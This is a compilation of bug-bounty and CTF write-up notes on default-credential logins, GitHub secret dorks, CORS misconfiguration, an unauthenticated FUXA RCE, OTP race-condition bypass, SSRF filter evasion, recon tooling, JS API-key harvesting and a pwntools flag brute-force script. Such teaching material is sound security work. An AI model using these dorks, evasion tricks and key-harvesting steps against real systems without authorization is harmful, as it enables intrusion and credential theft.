
### Battling Parasoft DTP :: Default Creds to RCE

Original Writeup Link : \https://xboy.me/post/CORP-RCE

Lets call the program xboy.me and in scope is \*xboy.me 
First do shodan dork 
```sh
ssl:"*.xboy.me"
```

Use this when you want to find low hanging and easily to find bugs, like open admin panels or any internal panels on weird (non-conventional) ports.

Found 
\https://dtp.xboy.me:8443/tcm/welcome.jsp?redirectUrl=https%3A%2F%2Fdtp.xboy.me%3A8443%2Ftcm%2Findex.html

Parasoft Development Testing Platform (DTP) : Default Creds = admin:admin worked

---

Link to Original Writeup : \https://medium.com/@hacdoc/how-i-get-my-first-bounty-ec4d83eb5fbf

Github Dorking
```sh
'site.com' db_Passwd
'redacted.com' credentials
'redacted.com' password
'redacted.com'	user
'redacted.com'	login-singin
'redacted.com'	passkey-passkeys
'redacted.com'	pass
'redacted.com'	secret
'redacted.com'	SecretAccessKey
'redacted.com'	app_AWS_SECRET_ACCESS_KEY AWS_SECRET_ACCESS_KEY
'redacted.com'	config
'redacted.com'	security_credentials
```

Website name : site.com
Search String : db_Passwd

This search targets files containing the keyword “db_password.” It helps identify potential instances where sensitive information, such as passwords, may be stored inappropriately.

---

### CORS(Cross Origin Resource Sharing)

Cross-Origin Resource Sharing (CORS) is a security feature implemented by browsers to restrict web pages from making requests to a different domain than the one that served the original web page.

Cross-Origin Resource Sharing (CORS) is a security mechanism implemented by web browsers to control how web pages from one origin/domain can request resources from another origin/domain. It's a set of HTTP headers that allow or restrict cross-origin requests made by client-side JavaScript code.

The Same-Origin Policy (SOP) is a fundamental security concept in web browsers that restricts how documents or scripts from one origin/domain can interact with resources from another origin/domain. Under SOP, web browsers prevent cross-origin requests initiated by client-side scripts, which helps mitigate various security threats such as Cross-Site Scripting (XSS) and data theft.

**Misconfiguration Types:**

- **Allowing All Origins ( * ):** This misconfiguration allows any domain to access resources on the server, bypassing SOP restrictions.

- **Allowing Specific Origins Without Proper Validation:** Allowing specific domains without proper validation can lead to the exposure of sensitive data to unauthorized origins.

- **Incorrect Handling of Credentials:** Misconfiguring CORS to allow credentials (cookies, authorization headers, etc.) without proper validation can lead to security vulnerabilities.

**Impact:**

- **Data Exposure:** Misconfigured CORS policies can allow unauthorized domains to access sensitive data, leading to data breaches.

- **Data Manipulation:** Attackers can exploit misconfigured CORS to perform unauthorized actions or modify data on behalf of users.

- **Information Leakage:** Improper CORS configuration can leak sensitive information about the server or application, aiding attackers in crafting more sophisticated attacks.

**Remediation:**

- **Proper CORS Configuration:** Configure CORS headers on the server to restrict access to trusted origins only.

- **Origin Whitelisting:** Explicitly whitelist trusted origins and validate incoming requests against the whitelist.

- **Use Credentials Carefully:** Avoid allowing credentials for cross-origin requests unless necessary, and ensure proper validation of credentials.

**Example**

```http
Request:  
GET /sensitive-victim-data HTTP/1.1  
Host:  
[vulnerable-website.com](http://vulnerable-website.com/)  
Origin:  
[https://malicious-website.com](https://malicious-website.com/)  
Cookie: sessionid=...  

Response:  
HTTP/1.1 200 OK  
Access-Control-Allow-Origin:  
[https://malicious-website.com](https://malicious-website.com/)  
Access-Control-Allow-Credentials: true
```

- The malicious website sends a GET request to `**vulnerable-website.com**` for sensitive victim data.

- The vulnerable server responds with an `**Access-Control-Allow-Origin**` header allowing the malicious website domain (`**https://malicious-website.com**`) to access the data.

- The server also allows credentials (`**Access-Control-Allow-Credentials: true**`) without proper validation, potentially exposing sensitive user session information.


---

#### CVE-2023–33831

A remote command execution (RCE) vulnerability in the /api/runscript endpoint of FUXA 1.1.13 allows attackers to execute arbitrary commands via a crafted POST request
FUXA : This is software to aid visualizing process flow in SCADA Operational Technology systems.
SCADA (supervisory control and data acquisition) is a category of software applications for controlling industrial processes, which is the gathering of data in Real Time from remote locations in order to control equipment and conditions.

The affected route is /api/runscript, where it is possible to execute commands without having to be authenticated through the code parameter via the POST method using the child_process module via the exec function.


---

### # Race Conditions + IDOR Leads to Bypass Email Verification & Phone Verification

- To ensure simultaneous sending, I used different browsers
- each with a different session, “**_as the server processes one request at a time per session.”_**
- Now, I sent the two requests at the exact same time by creating a group in Burp Suite and sending them using “Send group in parallel (last-byte sync)”.
- By exploiting the race condition, I was able to obtain the same OTP number for both the victim and the attacker, as shown in the image. I got the same OTP for two different numbers.

To complete the verification process, you need to verify the OTP through the link sent to the email. So, obtaining the OTP alone doesn’t serve any purpose.

After many attempts to bypass email verification, I noticed a parameter in the request body called “PKID”.
The interesting thing is that its value increases by one with each new account creation!

So, I created two accounts as part of the scenario: one as an attacker and the other as a victim, and I exploited the race condition to obtain the victim’s mobile OTP.

Now, all that’s left is to bypass the link sent to the email. I did this by accessing the link in the email (as the attacker) and modifying the “PKID” parameter value to be one digit higher or lower, such as changing it from 5 to either 4 or 6. I also set the OTP parameter value to the same OTP that was received on the attacker’s and victim’s numbers, making them match.

---

### Maximizing the potential of “Subfinder”


Link to original writeup : \https://muhdaffa.medium.com/maximizing-the-potential-of-the-subfinder-562fc7e7e9e4

##### Using “-all” flag
The function of `-all` the flag is to use all sources (crtsh, Common Crawl, Wayback Archive, etc.) when doing subdomain enumeration. If you use the basic command, then only a few sources are used.

--exclude-sources: This option allows us to exclude specific data sources from the enumeration process. For example, if we don't want to include results from Shodan, you can use the following command:

```sh
subfinder -d example.com --exclude-sources shodan
```

--no-passive: This option disables passive subdomain enumeration. This means that subfinder will only use active methods to enumerate subdomains, such as DNS resolution and HTTP requests. You can use the following command:

```sh
subfinder -d example.com --no-passive
```


--exclude-subdomains: This option allows you to exclude specific subdomains from the results. For example, if you want to exclude all subdomains that contain the string "test", you can use the following command:

```sh
subfinder -d example.com --exclude-subdomains "*test*"
```


-v or --verbose: Enable verbose output, which displays more information about the enumeration process.

-r or --recursive: Enable recursive subdomain enumeration. This option enables subfinder to search for subdomains of the subdomains it finds.

---

### Nmap flags

**-sC** → For default script.  
**-sV** → Version scan of the service.  
**-p-** → To scan all ports.  
**-O** → To scan the OS which the service is on.  
**-T4** → Separate scan for threads.

---

### Nuclei Usage

1) Dont run agressive scans before detecting the technology. It may trigger firewalls
2) Tricks to limit WAF detections, like using -H to set http header , -rl: rate limit flag to limit number of requests per second, -ss : scan strategy value set to 'host-spray' to make attack less aggressive
3) Dont run templates blindly that we get from other resources

---

\https://psychovik.medium.com/vulnerability-vault-breaking-down-ssrf-server-side-request-forgery-part-1-b7e658589dd9
### Vulnerability Vault: Breaking Down SSRF — Server Side Request Forgery (Part 1)

Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location.

Typically, an SSRF attack involves the attacker forcing the server to connect to internal services only found in the infrastructure of the company. Other times, they might be able to compel the server to establish a connection with any random external system. Sensitive information, including login credentials, might be exposed in this way.

**In simpler words**: Attackers ask the server to fetch a URL for his/her behalf

![](https://miro.medium.com/v2/resize:fit:744/0*zHM50Mp28C7b85NG.png)

Types of Server Side Request Forgery (SSRF) —
Basic SSRF — The one which display response back to adversaries
Blind SSRF — The one which doesn’t display response
Basic SSRF —
It display response back to attacker, so once the server fetches the URL with payload made by attacker, it will send response back to adversaries

What if the application have some servers running in their network such as Kibana, Elastic Search, MangoDB which are inaccessible to external internet due to protective measure, be it firewall or so.

![](https://miro.medium.com/v2/resize:fit:875/0*xX-PS1DsVBCEskXu.png)


Attackers runs a internal IP and port scan to understand more about the target’s infrastructure for further exploitation.

To demonstrate the impact of Blind  SSRF is to run an Internal IP and Port Scan

Mentioned below are the list of private IPv4 networks that can be used to scan for services:

- 10.0.0.0/8
- 127.0.0.1/32
- 172.16.0.0/32
- 192.168.0.0/16

We can determine whether the specified PORT is Open/Closed by observing the Response Time and Response Status.

Bypassing Whitelisting and Blacklisting —
Blacklisting in the context of SSRF mitigation refers to the practice of denying the server’s ability to make HTTP requests to specific domains, IP addresses, or URI schemes deemed unsafe or sensitive.
In one sentence, it’s — Blocking specific domains, IP address or URI (Disallowed Hosts).

Using Alternative Notations: IP addresses can be represented in various formats, such as decimal, hexadecimal, or octal, potentially bypassing naive IP address blacklists.
- Converting IP to hexadecimal —
You can use online tools(IP2hex) to do so.
For example: Converting \http://10.10.10.1 to doted hex —http://0a.0a.0a.01 or dot-less hex — \http://0x0a0a0a01
- Converting IP to Decimals —
- Converting IP to Octal —
- Shortened URLs:
Using URL shortening services to hide the actual destination of the malicious request until it’s too late for the blacklist to be effective.


---

\https://medium.com/@jeetpal2007/easiest-way-to-find-hidden-api-from-js-files-ce115a4ad1af
### Easiest way to find hidden api from js files

## Requirements

- extensor
- SecretFinder
- Waybackurls
- gau
- waymore
- subfinder
- urlremover
- Keyhack


1) Find subdomains using subfinder

```sh
subfinder -d indeed.com -v -o subdomains.txt
```
- -d : Define domain
- -v : verbose result
- -o : output file

2)  After the subdomain enumeration use waymore ,gau and waybacurls to get manys urls as possible

```sh
cat subdomains.txt | waybackurls > waybackurls.txt
```

```sh
cat subdomains.txt | gau > gau.txt
```

```sh
waymore -i subdomains.txt -mode U > waymore.txt
```

- -i : file name of subdomains
- -mode U : so only urls capture


3) Now will collect all urls into a single file naming as allurls

4) we will use extensor to find the endpoint file

5) we use SecretFinder to find apikeys from js file

```sh
cat js.txt  | while read url; do python3 /opt/SecretFinder/SecretFinder.py -i $url -o cli; done
```


It will shows all the possible credentials in js file

After it verify them using keyhack github repo it will provide you a curl command just change the endpoint(if applicable) and api key


---

\https://medium.com/@bouss3id.abdelkader/unquoted-bash-variable-security-implications-bypassing-if-condition-in-bash-ctf-write-up-79648dc4e910

### Unquoted bash variable security implications , bypassing if condition in bash (CTF-Write-up)

Chall script
```sh
#!/bin/bash  
PASSWORD=$FLAG  
read -p "Enter password: " USER_INPUT  
if [[ $PASSWORD == $USER_INPUT ]];then  
echo "Nice job, but did you get the flag?"  
else  
echo "So far away."  
fi
```

1. First it will assign the PASSWORD variable the value of the FLAG variable
2. Second :
```sh
read  -p "Enter password: " USER_INPUT
```

Here, the read command will display the message Enter password:, and whatever is typed in response will be stored as the value of USER_INPUT.

3. Afterwards, we’ll verify if the value entered by the user ( USER_INPUT) matches the value stored in the PASSWORD variable. If they match, it’ll display “Nice job, but did you get the flag?”; otherwise, it’ll show ‘So far away.

I’ve encountered a similar situation in the past, but with the test command. If we pay close attention, we’ll see that in our check, the variables aren’t enclosed in quotes “if \[\[ \$PASSWORD == \$USER_INPUT ]]“ not “if \[\[ "\$PASSWORD" == "$USER_INPUT" ]]“. This can pose a significant issue in certain situations and might create a vulnerability that allows bypassing certain checks, particularly in branches, whether using testor if.

So he means that if you don’t quote the variables , **they will be compare as pattern and not as string**, so the comparison can result true **for example if the value of the a variable is anything like “alphaCTF”** and the `b` v**ariable can be the pattern or regex** character ”`*`“ **(wildcard)** , so this can **cause bypassing of the if condition** , also you can make **a guessing of the value of the password by brute-forcing using patterns and regex.**


```python
#!/usr/bin/env python3  
  
import string  
import pwn  
import time  
  
# Define the host and port of the netcat server  
host = '35.228.220.66' # Change this to the IP address or hostname of the netcat server  
port = 1305 # Change this to the port number of the netcat server  
  
def connect_and_get_message(message):  
client_socket = pwn.connect(host, port)  
client_socket.sendlineafter("Enter password: ",message.encode())  
data=client_socket.recv().decode().strip()  
client_socket.close()  
return data  
  
  
# Loop to continuously receive data  
flag="AlphaCTF{"  
stop_while=False  
while not stop_while:  
if connect_and_get_message(f"{flag}{"[a-zA-Z]"}*")=="Nice job, but did you get the flag?":  
if connect_and_get_message(f"{flag}{"[A-Z]"}*")=="Nice job, but did you get the flag?":  
characters=string.ascii_uppercase  
else:  
characters=string.ascii_lowercase  
elif connect_and_get_message(f"{flag}{"[0-9]"}*")=="Nice job, but did you get the flag?":  
characters=string.digits  
else:  
characters='_'+'}'  
for i in characters:  
solution=f"{flag}{i}*"  
if connect_and_get_message(solution)=="Nice job, but did you get the flag?":  
flag=flag+i  
if i == '}':  
stop_while=True  
print(f"the flag is : {flag}")  
time.sleep(0.5)  
break  
print(f"the flag is : {flag}")
```

1. We utilized the `pwn` module to easily establish a socket connection with the server, similar to how we usually use `netcat` command. Then, we set a variable named ‘flag’ to “`AlphaCTF{`“ because that’s the expected format for the flag in this CTF so we know that it start with this string. Our plan is to guess the rest of the flag.
2. We have the boolean “stop_while” variable which will be used to stop the brute-forcing.
3. We have a function called `connect_and_get_message` that helps us talk to the server. It sends a message to the server and then waits to get a response. We use this function to avoid connecting to the server multiple times because the server closes the connection after it gets the message we want to send.
4. In the while loop, you’ll find several branches. The first one checks if the next character in the flag is an **ASCII alphabet character**. If it is, the script determines whether **it’s uppercase or lowercase**. If the character is **not an ASCII alphabet character**, the script checks if **it’s a digit**. If it’s neither an **alphabet character nor a digit, it could be either “_” or “}”** character. This approach **optimizes the brute-forcing process** by helping the script determine what to check next.
5. After selecting the character set to search within, the script iterates through that group of characters and tests each one to find the desired character using `characters` variable.

---

\https://medium.com/@rajput623929/bug-bounty-tutorial-login-bypass-technique-d7508856b2a1

### # Bug Bounty Tutorial : Login Bypass Technique

How to Bypass Login panel using SessionID

Session: A session is used to save information on the server momentarily so that it may be utilized across various pages of the website. It is the overall amount of time spent on an activity. The user session begins when the user logs in to a specific network application and ends when the user logs out of the program or shuts down the machine.

SessionID : A session ID, also called a session token, is a unique identifier that a web server assigns to a user for the duration of the current session. A session is a finite period of interaction between a web client and server.

Session fixation is a web-based attack technique where an attacker tricks the user into opening a URL with a predefined session identifier. Session fixation attacks can allow the attacker to take over a victim’s session to steal confidential data, transfer funds, or completely take over a user account.

1) First of all you need to get all login pages of your target system.

```sh
site:<target.com> inurl:login
```

POC of exploit : \https://youtu.be/DknJ1Z0J-HU


---

\https://hakluke.medium.com/haklukes-guide-to-amass-how-to-use-amass-more-effectively-for-bug-bounties-7c37570b83f7
### Guide to Amass — How to Use Amass More Effectively for Bug Bounties

Basic use

```sh
amass enum -d clicktheclapbutton50timesplz.com
```

example of yaml file containing API keys
\https://github.com/owasp-amass/amass/blob/master/examples/datasources.yaml

Now, when you use amass, specify the config file with the `-config` parameter, like this:

```sh
amass enum -d followhaklukeontwitter.com -config ./myconfigfile.yaml
```

- amass intel — Discover targets for enumerations
- amass enum — Perform enumerations and network mapping
- amass viz — Visualize enumeration results
- amass track — Track differences between enumerations
- amass db — Manipulate the Amass graph database

```sh
amass intel -org "Tesla"
```

```sh
amass enum -d example.com -active -cidr 1.2.3.4/24,4.3.2.1/24 -asn 12345
```

Note that you will first need to get the CIDRs and ASNs associated with the organisation using the `intel` methods


Every scan that you do with amass is automatically stored on the computer that you ran it on. Then, if you run the same scan again, amass will track any changes that have taken place since your last scan. The most obvious way to use this feature is to discover which subdomains have appeared since your last scan. For example, I ran `amass enum -d vimeo.com` back in June. It's now August, so I ran the same command again.

Now I can run `amass track -d vimeo.com` and it will tell me anything that has changed within the last two months.

```sh
amass track -d vimeo.com
```


---

\https://vijetareigns.medium.com/pii-disclosure-worth-750-758b72e7e8ca
### PII Disclosure Worth $750

\www.redacted.com and api.redacted.com are in scope. As usual, I started exploring the application and capturing every request in the proxy tool burp suite. redacted.com is the main domain but all the traffic routes through api.redacted.com.

After exploring the application, I started reviewing all the requests and responses from the **api.redacted.com**. There is one endpoint `https://api.redacted.com/api/v2/help-recovery/gethelp/getHelpFlow` POST request to the endpoint with body `{"user_type":"customer","flow_type":"request","request_id":"XXXXX","group_key":"view_payment_summary_group","mode":"published"}` is used to fetch the payment summary of the booked service. During reviewing the response of the endpoint. I found that the personal contact details of the service provider in key `masked_number` are exposed in plain text.

![](https://miro.medium.com/v2/resize:fit:875/1*CVB5OHgUxH4sZH9grsLctQ.png)

You can see in the above image that you need `request_id` (which is the **booking id**) to fetch the contact details of the service provider here `request_id` is not brute forcible and there is a proper authorization check on the API endpoint.

So, to increase the impact of the vulnerability I made 3–5 new COD bookings for the next day. The service provider for the upcoming booking is assigned within 30 min of creating a booking. I hit the vulnerable API endpoint `https://api.redacted.com/api/v2/help-recovery/gethelp/getHelpFlow` with a new `request_id` to fetch contact details of the service provider assigned to that specific booking and then I canceled the booking so that I don’t have to pay any cancellation charge.
